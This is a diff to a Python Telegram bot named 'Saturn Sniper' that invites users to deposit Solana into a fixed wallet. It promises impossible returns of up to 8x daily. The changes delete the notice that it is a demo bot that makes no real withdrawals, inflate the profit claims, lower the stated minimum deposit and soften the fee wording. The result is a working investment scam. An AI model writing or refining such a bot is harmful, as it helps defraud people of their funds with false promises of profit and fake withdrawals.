@@ -87,7 +87,7 @@ def settings_markup(user):
     lock_text = "🔒 Lock Address" if not user["address_locked"] else "🔓 Unlock Address"
     m = types.InlineKeyboardMarkup(row_width=2)
     m.add(
-        types.InlineKeyboardButton("✏️ Change Address", callback_data="change_address"),
+        types.InlineKeyboardButton("✏️ Change Withdrawal Address", callback_data="change_address"),
         types.InlineKeyboardButton(lock_text, callback_data="toggle_lock"),
         types.InlineKeyboardButton("⬅️ Back", callback_data="back_main")
     )
@@ -106,13 +106,13 @@ def build_main_text(user):
         "🪐 Your Solana Wallet Address (for deposits):\n"
         f"```{DEPOSIT_WALLET}```\n"
         f"Balance: {user['balance']:.1f} SOL 🔃\n\n"
-        "💰 (This address is used by our algorithm hosting to generate money daily.)\n\n"
+        "💰 (This address will be used by the bot to make profitable trades..)\n\n"
         "Profit Potential (per 24 hours):\n"
-        "✅ 2 SOL Deposit: Earn up to 1.5x daily\n"
-        "✅ 5 SOL Deposit: Earn up to 2.5x daily\n"
-        "✅ 10 SOL Deposit: Earn up to 5x daily\n\n"
+        "✅ 0.25 SOL Deposit: Earn up to 2x daily\n"
+        "✅ 0.5 SOL Deposit: Earn up to 5x daily\n"
+        "✅ 2+ SOL Deposit: Earn up to 8x daily\n\n"
         "⭐ Average Trade Profit: ~0.2 - 2.5+ SOL\n\n"
-        "⚠️ Note: A 3% fee applies to profits.\n\n"
+        "⚠️ Note: A 2% fee applies to profits in order to keep the bot online.\n\n"
         "Use the buttons below to manage Saturn Sniper.\n\n"
         "🟢"
     )
@@ -239,7 +239,7 @@ def callback(call):
         else:
             update_info_panel(
                 chat_id, user,
-                "⚙️ Processing your withdrawal...\n\n(This is a demo bot so no real withdrawal is made.)"
+                "⚙️ Processing your withdrawal...\n\n"
             )
         return
 
@@ -311,7 +311,7 @@ def callback(call):
         if user["balance"] < 1:
             update_info_panel(
                 chat_id, user,
-                "❌ You need at least **1 SOL** to start the sniper."
+                "❌ You need at least **0.25 SOL** to start the sniper."
             )
         else:
             user["sniper_running"] = True
@@ -490,3 +490,4 @@ def address_confirm(call):
 
 if __name__ == "__main__":
     bot.polling(none_stop=True)
+
